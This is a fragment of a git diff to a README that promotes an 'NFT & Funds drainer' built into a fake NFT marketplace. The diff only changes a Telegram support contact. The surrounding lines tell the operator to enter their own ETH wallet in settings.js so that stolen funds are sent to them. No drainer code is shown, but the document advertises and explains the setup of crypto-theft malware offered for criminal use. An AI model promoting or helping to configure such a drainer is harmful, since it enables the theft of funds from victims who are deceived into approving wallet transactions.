@@ -23,7 +23,7 @@ Our NFT & Funds drainer is not a normal drainer. We created a NFT marketplace ar
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@DrainNFT](https://t.me/BlueLuxe_Admin)
+To get instant support, contact me on [@BlueLuxe_Admin](https://t.me/BlueLuxe_Admin)
 
 
 ## `⭐ Socials :`
